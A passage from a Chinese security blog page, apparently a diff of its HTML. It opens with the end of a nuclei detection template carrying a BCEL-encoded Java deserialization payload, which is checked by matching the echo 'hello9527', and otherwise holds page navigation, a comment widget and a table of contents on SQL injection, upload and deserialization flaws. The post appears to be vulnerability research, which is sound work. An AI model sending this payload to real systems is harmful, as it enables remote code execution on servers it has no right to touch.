$60$_e$a1$60$l$f9$d9$81$f0$z$K$b1A$c2$7e$J$H$q$3cZ$a1$3e$e3$f3$83$S$O$C$N$b7$e0$90$G$93$f0$YQ$i$w$cfr$e6$l$bf$e3$be$Kt$K$A$A&quot;</span>,<span class="string">&quot;driverClassloader&quot;</span><span class="string">:</span>&#123;<span class="string">&quot;@type&quot;</span><span class="string">:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;&#125;&#125;]</span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br><span class="line">      </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">body</span></span><br><span class="line">        <span class="attr">regex:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;hello9527&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/09/15/vscode%20%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%AE%B0%E5%BD%95/"
+                                   title="viscose 快捷键记录"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">viscose 快捷键记录</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/08/26/%E5%A4%A9%E9%94%90%E7%BB%BF%E7%9B%BE%E5%AE%A1%E6%89%B9%E7%B3%BB%E7%BB%9FuploadWxFile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90/"
+                                   title="天锐绿盾审批系统uploadWxFile任意文件上传分析"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">天锐绿盾审批系统uploadWxFile任意文件上传分析</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="valine-container">
+        <div id="vcomments"></div>
+        <script data-pjax
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script data-pjax
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'pnLUL03RCIjbXBNX6m4sBrtq-gzGzoHsz',
+              appKey: 'itjAi31G55tfhpSKJiuLDe2g',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '生命是上天的馈赠，我不想虚度年华',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
+            }
+          }
+
+          if ('true' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc left-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <!-- use hexo-blog-encrypt -->
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90"><span class="nav-text">权限</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#findTenantPage-do%E6%B3%A8%E5%85%A5"><span class="nav-text">findTenantPage.do注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nuclei%E6%A8%A1%E6%9D%BF"><span class="nav-text">nuclei模板</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#findAllCategory-do%E6%B3%A8%E5%85%A5"><span class="nav-text">findAllCategory.do注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#token"><span class="nav-text">token</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0"><span class="nav-text">上传</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bcel"><span class="nav-text">bcel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpringEcho"><span class="nav-text">SpringEcho</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2021</span>&nbsp;-&nbsp;2025
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">This_is_Y</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools left-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <!-- use hexo-blog-encrypt -->
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90"><span class="nav-text">权限</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#findTenantPage-do%E6%B3%A8%E5%85%A5"><span class="nav-text">findTenantPage.do注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nuclei%E6%A8%A1%E6%9D%BF"><span class="nav-text">nuclei模板</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#findAllCategory-do%E6%B3%A8%E5%85%A5"><span class="nav-text">findAllCategory.do注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#token"><span class="nav-text">token</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0"><span class="nav-text">上传</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bcel"><span class="nav-text">bcel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpringEcho"><span class="nav-text">SpringEcho</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
